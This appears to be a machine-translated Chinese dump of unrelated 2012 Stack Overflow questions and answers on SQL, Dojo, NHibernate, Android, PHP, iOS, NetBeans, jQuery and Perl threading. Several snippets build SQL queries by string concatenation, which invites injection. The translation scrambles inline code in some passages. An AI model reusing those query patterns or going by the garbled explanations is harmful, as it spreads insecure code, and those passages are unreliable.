meetingsSDate = meetingsSDate.split(' ');
Meet_startTime = meetingsSDate[2] + ' ' + meetingsSDate[1]; 
```

# mysql - 将嵌套查询转换为连接

> ID：10597307
> 
> 赞同：0
> 
> 时间：2012-05-15T08:56:27.320
> 
> 标签：mysql, sql-server-2008, postgresql, join, insert

我想将以下嵌套查询转换为连接。

```
query = """ INSERT INTO ptable
            (a,b,c)
            (SELECT %d, 'valll',id
                                FROM btable
                                WHERE e = %d
                                AND f = %d);
         """ %(Data1,data2, data3) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-15T08:58:50.847

这不是嵌套查询。

对于嵌套查询，您需要在同一个选择中有许多表。

# c++ - 关于vc中的系统

> ID：10597311
> 
> 赞同：1
> 
> 时间：2012-05-15T08:56:46.313
> 
> 标签：c++

我在vc中运行下面的代码。

```
 system("@echo off");
 system("set a=3");
 system("echo %a%");
 system("pause"); 
```

但它显示为'%a%'，但我需要显示为'3'。

我怎样才能做到？非常感谢您的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:01:26.297

创建“tmp.bat”文件：

```
@echo off
set a=3
echo %a%
pause 
```

然后调用

```
system("cmd /c tmp.bat") 
```

问题是 system() 调用创建了一个“干净”的环境，其中尚未设置“a”变量（在“echo %a%”调用中）。

要将命令序列转换为“可执行”的东西，可能会使用一些特殊的工具，而不是“VC”。

寻找[http://www.autoitscript.com/site/autoit/](http://www.autoitscript.com/site/autoit/) 和类似的工具。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-15T09:00:37.727

首先，这些命令中的每一个都独立于另一个运行。当您尝试 echo`%a%`时，`set`for it （从上一次调用 到`system`）早已被遗忘。因此，这实际上与您打开一个全新的`cmd`窗口并输入：

```
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\Documents and Settings\Pax> echo %a%
%a%

C:\Documents and Settings\Pax> _ 
```

您可能需要将所有这些指令放入一个`cmd`文件中，然后运行：

```
system ("cmd /c c:\\full\\path\\to\my\\script.cmd"); 
```

# dojo - Dojo：如何在页面加载时以声明方式显示模式对话框

> ID：10597315
> 
> 赞同：1
> 
> 时间：2012-05-15T08:57:10.477
> 
> 标签：dojo

我在dojo中以声明方式创建了模态对话框，我想在页面加载时向用户显示它，但我不明白为什么下面的代码在页面加载时没有在浏览器上显示任何内容。谁能告诉我我做错了什么？

```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Hello Dijit!</title>
    <!-- load Dojo -->

    <link rel="stylesheet" href="../lib/dijit/themes/claro/claro.css">

    <link rel="stylesheet" href="../../css/style.css">

    <script src="../lib/dojo/dojo.js" data-dojo-config="isDebug: true, async: true, parseOnLoad: true"></script>
        <script>
     require(["dojo/ready","dojo/parser","dijit/Dialog", "dijit/form/ComboBox", "dijit/Menu", "dijit/MenuItem", "dojox/form/PasswordValidator","dijit/form/ValidationTextBox","dijit/form/Form","dijit/form/SimpleTextarea","dijit/form/Button"]);</script>
     </script>

</head>
<!-- set the claro class on our body element -->
<body class="claro">
  <div data-dojo-id ="dialogOne" data-dojo-type = "dijit.Dialog" title = "Create Users" style="display: none">
  <div class="dijitDialogPaneContentArea">
    <div class = "formQuestion">
         <span>Personal Details</span>
        </div>    
        <div>

          <label class = "firstLabel" for="Pname">Name </label>
          <input type ="text" id ="Pname" data-dojo-type="dijit.form.ValidationTextBox"
          data-dojo-props = "required :'true', invalidMessage:'',ucfirst:'true'" tabindex = '1'/>
          <label class = "secondLabel" for = "combo">Role </label>
            <Select id="combo" data-dojo-type="dijit.form.ComboBox" tabindex = '2'>
                <option>Admin</option>
                <option>User</option>
            </Select><br>
            <label class = "firstLabel" for="Pemail">Email</label>
                <input type="text" id="Pemail" name="address" 
                    data-dojo-type="dijit.form.ValidationTextBox"
                    data-dojo-props = "placeHolder:'(will be the username)',
                    trim:'true',
                    ucfirst : 'true'" tabindex = '3'/>
            <label class = "secondLabel" for="Pmobile">Mobile</label>
                <input type="text" id="Pmobile" name="address" tabindex = '4'
                    data-dojo-type="dijit.form.ValidationTextBox"
                    data-dojo-props = " trim : 'true',
                    regExp : '(\\d){10}',
                    invalidMessage : 'Mobile number is invalid',
                    ucfirst : 'true'" /><br>
            <div dojoType="dojox.form.PasswordValidator"
            name="password">
            <div><label class = "firstLabel" for ="pass">Password </label><input type="password" id ="pass"
                pwType="new" tabindex = '5'/>
                <label class = "secondLabel" for ="confirm">Confirm Password </label><input type="password"
                pwType="verify" tabindex = '6'/></div>
        </div><br>
<div class ="dijitDialogPaneActionBar">
            <button data-dojo-type = "dijit.form.Button" type ="submit" tabindex = '10' id = "ok" onClick="return dialogOne.isValid();">OK</button>
            <button data-dojo-type = "dijit.form.Button" type = "button" tabindex = '11' onClick = "dialogOne.onCancel();" id = "cancel">Cancel</button>
            </div>
    </div>
    <!-- This event is not firing -->
    <script type="dojo/method" data-dojo-event="onLoad" >
        dialogOne.show();
    </script>
  </div>
 </body>
</html>​ 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-13T07:00:05.867

试试下面的代码。更改加载道场部分以指向正确的道场路径。

```
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <title>Hello Dijit!</title>
        <!-- load Dojo -->

        <link rel="stylesheet" href="../dijit/themes/claro/claro.css">

        <script src="../dojo/dojo.js" data-dojo-config="isDebug: true, async: true, parseOnLoad: true"></script>
        <script>
            require(["dojo/ready","dijit/Dialog", "dijit/form/ComboBox", "dijit/Menu", "dijit/MenuItem", "dojox/form/PasswordValidator","dijit/form/ValidationTextBox","dijit/form/Form","dijit/form/SimpleTextarea","dijit/form/Button","dojo/domReady!"]
            , function(ready){
                ready(function(){
                    console.debug("Ready!");
                    dialogOne.show();
                });
            });
        </script>

    </head>
    <!-- set the claro class on our body element -->
    <body class="claro">
        <div data-dojo-id ="dialogOne" data-dojo-type = "dijit.Dialog" title = "Create Users" style="display: none">
            <div class="dijitDialogPaneContentArea">
                <div class = "formQuestion">
                    <span>Personal Details</span>
                </div>    
                <div>
                    <label class = "firstLabel" for="Pname">Name </label>
                    <input type ="text" id ="Pname" data-dojo-type="dijit.form.ValidationTextBox"
                           data-dojo-props = "required :'true', invalidMessage:'',ucfirst:'true'" tabindex = '1'/>
                    <label class = "secondLabel" for = "combo">Role </label>
                    <Select id="combo" data-dojo-type="dijit.form.ComboBox" tabindex = '2'>
                        <option>Admin</option>
                        <option>User</option>
                    </Select><br>
                    <label class = "firstLabel" for="Pemail">Email</label>
                    <input type="text" id="Pemail" name="address" 
                           data-dojo-type="dijit.form.ValidationTextBox"
                           data-dojo-props = "placeHolder:'(will be the username)',
                           trim:'true',
                           ucfirst : 'true'" tabindex = '3'/>
                    <label class = "secondLabel" for="Pmobile">Mobile</label>
                    <input type="text" id="Pmobile" name="address" tabindex = '4'
                           data-dojo-type="dijit.form.ValidationTextBox"
                           data-dojo-props = " trim : 'true',
                           pattern : '(\\d){10}',
                           invalidMessage : 'Mobile number is invalid',
                           ucfirst : 'true'" /><br>
                    <div dojoType="dojox.form.PasswordValidator"
                         name="password">
                        <div><label class = "firstLabel" for ="pass">Password </label><input type="password" id ="pass"
                                                                                             pwType="new" tabindex = '5'/>
                            <label class = "secondLabel" for ="confirm">Confirm Password </label><input type="password"
                                                                                                        pwType="verify" tabindex = '6'/>
                        </div>
                    </div><br>
                    <div class ="dijitDialogPaneActionBar">
                        <button data-dojo-type = "dijit.form.Button" type ="submit" tabindex = '10' id = "ok" onClick="return dialogOne.isValid();">OK</button>
                        <button data-dojo-type = "dijit.form.Button" type = "button" tabindex = '11' onClick = "dialogOne.onCancel();" id = "cancel">Cancel</button>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>​ 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-15T09:49:59.687

尝试在函数`dialogOne.show()`的回调中调用，将其更改为并将其放在模块数组的末尾`require``"dojo/ready"``"dojo/domReady!"`

# mysql - mysql 许多来自子查询的计数

> ID：10597318
> 
> 赞同：-1
> 
> 时间：2012-05-15T08:57:24.687
> 
> 标签：mysql, sql

我有一个选择查询，但我希望在结果中也有几个计数作为列：计算与 t1 行关联的 t3 行数以及与 t2 行关联的 t3 行数。结果应该有列：t1t3Count，t2t3Count。对于第一行 t1T3Count 应该等于 5，并且 t2t3count

```
create table t1 (id int, name text);
insert into t1 values(1, 'name1');
insert into t1 values(2, 'name2');
create table t2 (id int, t1Id int, name text);
insert into t2 values(1, 1, 't2name1');
insert into t2 values(2, 1, 't2name2');
insert into t2 values(3, 2, 't2name3');
create table t3 (id int, t2Id int, name text);
insert into t3 values(1, 1, 't3name1');
insert into t3 values(2, 1, 't3name2');
insert into t3 values(3, 1, 't3name3');
insert into t3 values(4, 2, 't3name3');
insert into t3 values(5, 2, 't3name3');
insert into t3 values(6, 3, 't3name3');

   mysql> select * from t1 join t2 on(t1.id=t2.t1Id) join t3 on(t2.id=t3.t2Id);
+------+-------+------+------+---------+------+------+---------+
| id   | name  | id   | t1Id | name    | id   | t2Id | name    |
+------+-------+------+------+---------+------+------+---------+
|    1 | name1 |    1 |    1 | t2name1 |    1 |    1 | t3name1 |
|    1 | name1 |    1 |    1 | t2name1 |    2 |    1 | t3name2 |
|    1 | name1 |    1 |    1 | t2name1 |    3 |    1 | t3name3 |
|    1 | name1 |    2 |    1 | t2name2 |    4 |    2 | t3name3 |
|    1 | name1 |    2 |    1 | t2name2 |    5 |    2 | t3name3 |
|    2 | name2 |    3 |    2 | t2name3 |    6 |    3 | t3name3 |
+------+-------+------+------+---------+------+------+---------+ 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-15T11:20:07.913

好吧，如果我理解正确，您想计算从 t1 到 t2 和 t3 的所有项目的总出现次数，对吗？

如果是这样，所提供的数据必须导致

name1 = 5 {2 在 t2 和 3 在 t3} 和 name2 = 3 {1 在 t2 和 2 在 t3}

如果以上是您想要的，那么这就是您想要的

```
SELECT 
      t1.id, t1.name, 
      COALESCE( t2Counts.t2Count, 000000 ) + COALESCE( t3Counts.t3Count, 000000 ) AS total_occurences_in_t2_and_t3
   FROM
      ( SELECT @t2Countt := 0,
               @t3Countt := 0
        ) sqlvars,
      t1
        LEFT JOIN ( SELECT t1Id, COUNT(*) AS t2Count
                       FROM t2
                       GROUP BY t1Id ) AS t2Counts
           ON t1.id = t2Counts.t1Id

        LEFT JOIN ( SELECT t2Id, COUNT(*) AS t3Count
                       FROM t3
                       GROUP BY t2Id ) AS t3Counts
           ON t1.id = t3Counts.t2Id 
```

如果我把你弄错了更好[检查这个](https://stackoverflow.com/questions/10448695/how-to-optimize-query-if-table-contain-10000-entries-using-mysql/10449699#comment13534637_10449699)它有更多的解释

希望这会帮助你。

# objective-c - IBOutlet UIViews 为空？

> ID：10597319
> 
> 赞同：1
> 
> 时间：2012-05-15T08:57:27.747
> 
> 标签：objective-c, uiview, uiimageview, nib, iboutlet

我有一个名为的类`ActorController`，它有一个 NIB 文件。我在 NIB 文件中创建了与各种s 和`IBOutlet`s匹配的 s。但是，这些视图从未像应有的那样显示在屏幕上。经过进一步调查，我发现如果我使用将 UIView 对象打印到控制台，它会打印. 有人可以建议我可能做错了什么吗？任何帮助表示赞赏。`ActorController.h``UIView``UIImageView``NSLog``null`

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-15T09:08:36.223

一些要寻找的东西：

*   笔尖根本没有加载：
    *   错误的名字
    *   nib 文件未包含在项目中
    *   大小写问题（iOS 在设备上区分大小写）
*   未连接的插座（但视图仍应显示在屏幕上）
*   插座已连接，但连接到错误的对象
*   视图控制器已正确创建和初始化，但未显示
*   活动视图控制器不是您从笔尖初始化的控制器

# performance - 休眠分页性能

> ID：10597325
> 
> 赞同：1
> 
> 时间：2012-05-15T08:57:49.737
> 
> 标签：performance, nhibernate

我的表包含超过 1200 万行。

我需要使用 Lucene.NET 索引这些行（我需要执行初始索引）。

因此，我尝试通过从 sql 读取批处理数据包（每批 1000 行）以批处理方式进行索引。

这是它的外观：

```
public void BuildInitialBookSearchIndex()
{
            FSDirectory directory = null;
            IndexWriter writer = null;

            var type = typeof(Book);

            var info = new DirectoryInfo(GetIndexDirectory());

            //if (info.Exists)
            //{
            //    info.Delete(true);
            //}

            try
            {
                directory = FSDirectory.GetDirectory(Path.Combine(info.FullName, type.Name), true);
                writer = new IndexWriter(directory, new StandardAnalyzer(), true);
            }
            finally
            {
                if (directory != null)
                {
                    directory.Close();
                }

                if (writer != null)
                {
                    writer.Close();
                }
            }

            var fullTextSession = Search.CreateFullTextSession(Session);

            var currentIndex = 0;
            const int batchSize = 1000;

            while (true)
            {
                var entities = Session
                    .CreateCriteria<BookAdditionalInfo>()
                    .CreateAlias("Book", "b")
                    .SetFirstResult(currentIndex)
                    .SetMaxResults(batchSize)
                    .List();

                using (var tx = Session.BeginTransaction())
                {
                    foreach (var entity in entities)
                    {
                        fullTextSession.Index(entity);
                    }

                    currentIndex += batchSize;

                    Session.Flush();
                    tx.Commit();
                    Session.Clear();
                }

                if (entities.Count < batchSize)
                    break;
     }
} 
```

但是，当当前索引大于 6-7 百万时，操作会超时。NHibernate 分页会引发超时。

任何建议，NHibernate 中的任何其他方式来索引这 1200 万行？

**编辑：**

可能我会实施最农民的解决方案。

因为 BookId 是我表中的集群索引，并且 BookId 的选择发生得非常快，所以我将找到最大 BookId 并遍历所有记录并为所有记录编制索引。

```
for (long = 0; long < maxBookId; long++)
{
   // get book by bookId
   // if book exist, index it
} 
```

如果您有任何其他建议，请回复此问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T09:46:42.170

您可以尝试分而治之，而不是对整个数据集进行分页。你说你有一个关于 book id 的索引，只需更改你的标准以根据 bookid 的范围返回一批书：

```
var entities = Session
    .CreateCriteria<BookAdditionalInfo>()
    .CreateAlias("Book", "b")
    .Add(Restrictions.Gte("BookId", low))
    .Add(Restrictions.Lt("BookId", high))
    .List(); 
```

低和高设置为 0-1000、1001-2000 等

# android - 按钮选择状态Android？

> ID：10597330
> 
> 赞同：0
> 
> 时间：2012-05-15T08:58:14.277
> 
> 标签：android, image, button

我正在开发一个由按钮组成的应用程序。这是我的问题，如何设置选中状态和未选中状态。

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">

    <item android:drawable="@drawable/ox_mnu_dashboard_over" android:state_selected="true"/>
    <item android:drawable="@drawable/ox_mnu_dashboard_normal"/>

</selector> 
```

我正在使用此代码，但不适用于我。这是xml文件：

```
 <FrameLayout
        android:id="@+id/tabDashboard"
        android:layout_width="60dip"
        android:layout_height="wrap_content"
        android:layout_marginLeft="2dip"
        android:layout_weight="1"
        android:clickable="true" >

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:layout_gravity="bottom|center_horizontal"
            android:focusableInTouchMode="true"
            android:marqueeRepeatLimit="marquee_forever"
            android:scrollHorizontally="true"
            android:singleLine="true"
            android:text="@string/dashboard"
            android:textColor="@color/white"
            android:textSize="12sp" />

        <ImageButton
            android:id="@+id/btnDashboard"
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:background="@drawable/tab_dashboard"
            android:clickable="true" />
    </FrameLayout> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:03:35.523

您可以在单击该 imageButton 时设置图像，如下面的代码。

```
int isClicked =  0;
image = (ImageButton) findViewById(R.id.image);
    image.setOnClickListener(new OnClickListener() {

        public void onClick(View v) {
            if (isClicked1 == 0) {
                 image.setImageResource(R.drawable.second_image);
                isClicked1 = 1;
            } else {
                image.setImageResource(R.drawable.original_image);
                isClicked1 = 0;
            }

        }
     });' 
```

# php - 按级别统计结果

> ID：10597332
> 
> 赞同：5
> 
> 时间：2012-05-15T08:58:20.383
> 
> 标签：php, mysql

我有这样的邻接列表模式结构，我想根据级别计算父级的所有标题，例如`Food = (2,4,3), Fruit = (3,3)`

树表结构

![在此处输入图像描述](../Images/37be4feb664bbfcf6f9aad520f48135e.png)

之后像那样做树

![在此处输入图像描述](../Images/6957fa186f029d79952cd01d31902752.png)

通过这段代码，我得到了正确的总数，例如 Food = 9, Fruit = 6

```
function display_children($parent, $level) 
{

 $result = mysql_query('SELECT title FROM tree '.'WHERE parent="'.$parent.'"');
 $count = 0;
  while ($row = mysql_fetch_array($result))
   {
    $data=  str_repeat(' ',$level).$row['title']."\n";
    echo $data;
    $count += 1 + $this->display_children($row['title'], $level+1);
   }  
    return $count; 
 } 
```

调用函数

```
 display_children(Food, 0) 
```

结果 : 9 // 但我想得到像 2,4,3 这样的结果

但我想根据级别获得像 For Food 2,4,3 和 For Fruit 3,3 这样的计数总结果

所以请指导如何根据级别获得总数

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-16T12:28:47.930

```
function display_children($parent, $level) 
{

 $result = mysql_query('SELECT title FROM tree '.'WHERE parent="'.$parent.'"');
 $count = "";
  while ($row = mysql_fetch_array($result))
   {
    $data=  str_repeat(' ',$level).$row['title']."\n";
    echo $data;
    if($count!="")   
        $count .= (1 + $this->display_children($row['title'], $level+1));
    else
        $count = ", ".(1 + $this->display_children($row['title'], $level+1));
   }  
    return $count; 
 } 
```

让我们尝试一次..

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-18T07:25:15.077

如果您想按级别获取金额，请让函数按级别返回它们。

```
function display_children($parent, $level) 
{

 $result = mysql_query('SELECT title FROM tree WHERE parent="'.$parent.'"');
 $count = array(0=>0);
  while ($row = mysql_fetch_array($result))
   {
    $data=  str_repeat(' ',$level).$row['title']."\n";
    echo $data;
    $count[0]++;
    $children= $this->display_children($row['title'], $level+1);
    $index=1;
    foreach ($children as $child)
    {
     if ($child==0)
      continue;
     if (isset($count[$index]))
      $count[$index] += $child;
     else    
      $count[$index] = $child;
     $index++;
    }
   }  
    return $count; 
 } 
```

请注意，我很难调试代码，因为我没有你的表。如果有任何错误让我知道，我会修复它。无论如何，结果将是数组，其中应包含索引指定的级别数量：

```
$result=display_children("Food", 0) ;
var_export($result);//For exact info on all levels 
echo $result[0];//First level, will output 2
echo $result[1];//Second level, will output 4
echo $result[2];//Third level, will output 3 
```

顺便说一句，您的数据库中有错字，我猜 id 10（牛肉）应该有父“肉”而不是“节拍”。

如果您想查看测试页面，请[点击此处](http://test.hanzlsoft.eu/stack.php)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-21T17:18:11.773

本文包含了使用 mysql 创建树所需的所有内容，以及如何逐级[计数](http://mirror.neu.edu.cn/mysql/tech-resources/articles/hierarchical-data.html)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-22T01:48:11.073

如果您不介意更改架构，我有一个更简单的替代解决方案。

你有你的日期在这样的表中......

```
item             id
-------------+------
Food         |  1
Fruit        |  1.1
Meat         |  1.2
Red Fruit    |  1.1.1
Green Fruit  |  1.1.2
Yellow Fruit |  1.1.3
Pork         |  1.2.1 
```

查询现在要简单得多，因为它们只是简单的字符串操作。这适用于几百到几千个条目的小型列表 - 它可能无法很好地扩展 - 我没有尝试过。

但是要计算第二级有多少东西，你可以做一个正则表达式搜索。

```
select count(*) from items
where id regexp '^[0-9]+.[0-9]+$' 
```

第三层只是

```
select count(*) from items
where id regexp '^[0-9]+.[0-9]+.[0-9]+$' 
```

如果您只想要一个位于第 2 层的子分支

```
select count(*) from items
where id regexp '^[0-9]+.[0-9]+$'
and id like "1.%" 
```

它的优点是您不需要在数据库上运行尽可能多的查询，并且作为奖励，它更容易读取表中的数据并查看发生了什么。

我有一种唠叨的感觉，这可能不被认为是“好的形式”，但它确实非常有效。我会对这种方法的任何批评非常感兴趣，DB 人认为这是一个很好的解决方案吗？如果表非常大，那么一直进行表扫描和正则表达式会变得非常低效 - 你的方法会更好地利用任何索引，这就是为什么我说这可能不能很好地扩展，但鉴于你没有不需要运行这么多查询，这可能是一个值得进行的权衡。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-05-19T18:21:49.950

php类的解决方案：

```
<?php

class LevelDepCount{

    private $level_count=array();

    /**
     * Display all child of an element
     * @return int Count of element
     */
    public function display_children($parent, $level, $isStarted=true) 
    {
    if($isStarted)
            $this->level_count=array(); // Reset for new ask
     $result = mysql_query('SELECT title FROM tree '.'WHERE parent="'.$parent.'"');
     $count = 0; // For the level in the section
      while ($row = mysql_fetch_array($result))
       {
        $data=  str_repeat(' ',$level).$row['title']."\n";
        echo $data;
        $count += 1 + $this->display_children($row['title'], $level+1,false);
       }
        if(array_key_exists($level, $this->level_count))
            $this->level_count[$level]+=$count;
        else
            $this->level_count[$level]=$count;
            return $count; 
    }

    /** Return the count by level.*/
    public function getCountByLevel(){
        return $this->level_count;
    }

}

$counter=new LevelDepCount();
$counter->display_children("Food",0);
var_dump($counter->getCountByLevel());

?> 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-22T04:07:25.893

如果您修改查询，您可以一举获得所有数据，而无需进行太多计算（代码未经测试）：

```
/* Get all the data in one swoop and arrange it for easy mangling later */
function populate_data() {
    $result = mysql_query('SELECT parent, COUNT(*) AS amount, GROUP_CONCAT(title) AS children FROM tree GROUP BY parent');
    $data = array();
    while ($row = mysql_fetch_assoc($result)) {
       /* Each node has the amount of children and their names */
       $data[$row['parent']] = array($row['children'], int($row['amount']));
    }
    return $data;
}

/* The function that does the whole work */
function get_children_per_level($data, $root) {
    $current_children = array($root);
    $next_children = array();
    $ret = array();

    while(!empty($current_children) && !empty($next_children)) {
        $count = 0;
        foreach ($current_children as $node) {
            $count += $data[$node][0]; /* add the amount */
            $next_children = array_merge($next_children, explode($data[$node][1])); /* and its children to the queue */
        }
        ret[] = $count;
        $current_children = $next_children;
        $next_children = array();
    }

    return $ret;
}

$data = populate_data();
get_children_per_level($data, 'Food'); 
```

修改函数以在每次调用或每个级别调用一次以填充数据结构而不将整个表放入内存中应该不难。如果你有只有几个孩子的深树，我建议不要这样做，因为一举获得所有数据并计算它会更有效。如果你有很多孩子的浅树，那么它可能值得改变。

也可以将所有内容放在一个函数中，但我会避免在不需要时为重复调用重新计算数据。一个可能的解决方案是使它成为一个类，将`populate_data`函数用作将其存储为内部私有属性的构造函数和一个与`get_children_per_level`没有第一个参数相同的方法，因为它将从其内部私有中获取数据财产。

无论如何，我还建议您将 ID 列用作“父”引用而不是其他列。首先，如果任何名称包含逗号：P，我的代码将中断。此外，您可能有两个具有相同名称的不同元素。例如，您可以拥有`Vegetables -> Red -> Pepper`，并且`Red`将与 Fruit's 一起下滑`Red`。

另外需要注意的是，如果您的数据库数据不是树，我的代码将进入无限循环。如果图中有任何循环，它将永远不会结束。通过保留一个`$visited`包含所有已访问节点的数组而不将它们推入`$next_children`循环内的数组（可能使用`array_diff($data[$node][1], $visited)`.

# iphone - UITableView 滚动后加载相同的标题

> ID：10597336
> 
> 赞同：1
> 
> 时间：2012-05-15T08:58:37.883
> 
> 标签：iphone, objective-c, xcode, uitableview

我有一个以编程方式显示内容的 UITableView。

首次打开时单元格加载正常，但滚动后它们都显示相同的标题，我假设这是最后一个单元格标题。

如果选择了单元格，则打开的底层 TableView 仍然可以正常工作。

我在 SO 上查找了解决方案，但它们要么对我不起作用，要么我太笨而无法理解问题，这似乎是为了某种节省资源而重用单元格。

我将发布 cellForRowAtIndexPath ，因为我认为问题就在那里，如果需要任何进一步的代码，请告诉我。

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath
{
    static NSString *CellIdentifier = @"Cell";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:CellIdentifier];

    if (cell == nil) {
           cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:CellIdentifier];
    }

    NSString *oneLine = [entrys objectAtIndex:position];
    NSArray *lineComponents = [oneLine componentsSeparatedByString:@";"];

    cell.textLabel.text = [lineComponents objectAtIndex:0];
    cell.textLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.2 alpha:1.0];

    if (position < [entrys count] -2 ) {
        position++;
    }

    return cell;
} 
```

提前致谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-15T09:03:51.143

您根本没有使用该`indexPath`参数。应该是：

```
NSString *oneLine = [entrys objectAtIndex:indexPath.row]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-15T09:00:44.283

试试这个而不是位置

```
 NSString *oneLine = [entrys objectAtIndex:indexpath.row];
    NSArray *lineComponents = [oneLine componentsSeparatedByString:@";"];

    cell.textLabel.text = [lineComponents objectAtIndex:0];
    cell.textLabel.textColor = [UIColor colorWithRed:0.0 green:0.8 blue:0.2 alpha:1.0]; 
```

或者

如果它仍然不起作用，那么您的数组未正确初始化。初始化它

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-15T09:10:06.550

问题就在这里

```
 if (position < [entrys count] -2 ) {
        position++;
    } 
```

您在表中的行大于数组计数`entrys`，并且由于这种情况，您`position`将递增到最后一个对象，之后这个条件永远不会被调用，因此您`position`指向最后一个对象。你能告诉你从你的`tableView:numberOfRowsInSection:`方法返回了什么吗？

# netbeans - 在 netBeans 中删除一行的快速方法

> ID：10597339
> 
> 赞同：28
> 
> 时间：2012-05-15T08:58:48.230
> 
> 标签：netbeans, netbeans-7, netbeans-plugins

我正在寻找一种快速的方法来删除 netBeans 中的一行。

例如，在 vim 中，您只需键入`dd`删除一行。

* * *

## 回答 #1

> 赞同：48
> 
> 时间：2012-05-15T09:01:20.320

Ctrl-E 不适合你吗？这是 Windows 机器上 NetBeans 中的默认快捷方式。

如果您单击帮助，您可以获得键盘快捷键卡，将其打印出来，它非常方便，并且为我节省了很多时间寻找更简单的方法来做事。

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-05-15T09:05:41.720

当您的光标在要删除的行上时按`Ctrl`+`x`或`Ctrl`+ 。`e`

该命令将删除该行并将光标置于下一行的开头。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2018-09-15T03:07:27.773

对于 Mac 命令，它是`command`+ `e`。

# jquery - 更改 jQuery 存储事件绑定的方式及其对 fireQuery 附加组件的影响

> ID：10597343
> 
> 赞同：0
> 
> 时间：2012-05-15T08:58:55.493
> 
> 标签：jquery, firebug

在 jQuery 1.6.4 之前，您可以在使用 fireQuery 附加组件时看到哪些事件绑定到 Firebug 中的元素。然后从 jQuery 版本 1.7 fireQuery 停止显示事件数据。您仍然可以看到绑定到使用元素的数据`$(el).data({})`。我知道 jQuery 曾经将事件存储为数据属性，因此您可以使用`$(el).data("events")`.

所以我的问题是...

为什么使用 jQuery 1.7+ 时 fireQuery 不能显示事件数据。jQuery 是否改变了它存储事件绑定的方式。

它在这里工作......

[http://firequery.binaryage.com/test/?v=1.6.4](http://firequery.binaryage.com/test/?v=1.6.4)

但这里没有

[http://firequery.binaryage.com/test/?v=1.7.0](http://firequery.binaryage.com/test/?v=1.7.0)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-15T22:48:45.877

见常见问题，第二个问题： http: [//firequery.binaryage.com/#faq](http://firequery.binaryage.com/#faq)

# multithreading - 使用共享变量的 Perl 线程性能

> ID：10597344
> 
> 赞同：4
> 
> 时间：2012-05-15T08:59:04.433
> 
> 标签：multithreading, performance, perl

我正在开发一个用 Perl 实现的项目，并认为使用线程来分配工作是一个不错的主意，因为这些任务可以相互独立地完成，并且只能从内存中的共享数据中读取。但是，性能与我预期的相差甚远。因此，经过一番调查，我只能得出结论，Perl 中的线程基本上很烂，但我一直想知道，一旦我实现了一个共享变量，性能就会下降。

例如，这个小程序没有共享任何东西，并且消耗了 75% 的 CPU（如预期的那样）：

```
use threads;

sub fib {
  my ( $n ) = @_;
  if ( $n < 2 ) {
     return $n;
  } else {
     return fib( $n - 1 ) + fib( $n - 2 );
  }
}

my $thr1 = threads->create( 'fib', 35 );
my $thr2 = threads->create( 'fib', 35 );
my $thr3 = threads->create( 'fib', 35 );

$thr1->join;
$thr2->join;
$thr3->join; 
```

一旦我引入一个共享变量`$a`，CPU 使用率就在 40% 到 50% 之间：

```
use threads;
use threads::shared;

my $a : shared;
$a = 1000;

sub fib {
  my ( $n ) = @_;
  if ( $n < 2 ) {
    return $n;
  } else {
    return $a + fib( $n - 1 ) + fib( $n - 2 ); # <-- $a was added here
  }
}

my $thr1 = threads->create( 'fib', 35 );
my $thr2 = threads->create( 'fib', 35 );
my $thr3 = threads->create( 'fib', 35 );

$thr1->join;
$thr2->join;
$thr3->join; 
```

`$a`只读也是如此，不会发生锁定，但性能会降低。我很好奇为什么会这样。

目前我在 Windows XP 上的 Cygwin 下使用 Perl 5.10.1。不幸的是，我无法在具有（希望）更新的 Perl 的非 Windows 机器上对此进行测试。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-15T09:14:59.220

您的代码是围绕同步结构的紧密循环。通过让每个线程将共享变量（每个线程仅一次）复制到非共享变量中来优化它。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2018-01-21T07:41:50.920

在 Perl 中构造一个包含大量数据的共享对象是可能的，而不必担心额外的副本。生成工作线程时不会影响性能，因为共享数据驻留在单独的线程或进程中，具体取决于是否使用线程。

```
use MCE::Hobo;    # use threads okay or parallel module of your choice
use MCE::Shared;

# The module option constructs the object under the shared-manager.
# There's no trace of data inside the main process. The construction
# returns a shared reference containing an id and class name.

my $data = MCE::Shared->share( { module => 'My::Data' } );
my $b;

sub fib {
  my ( $n ) = @_;
  if ( $n < 2 ) {
    return $n;
  } else {
    return $b + fib( $n - 1 ) + fib( $n - 2 );
  }
}

my @thrs;

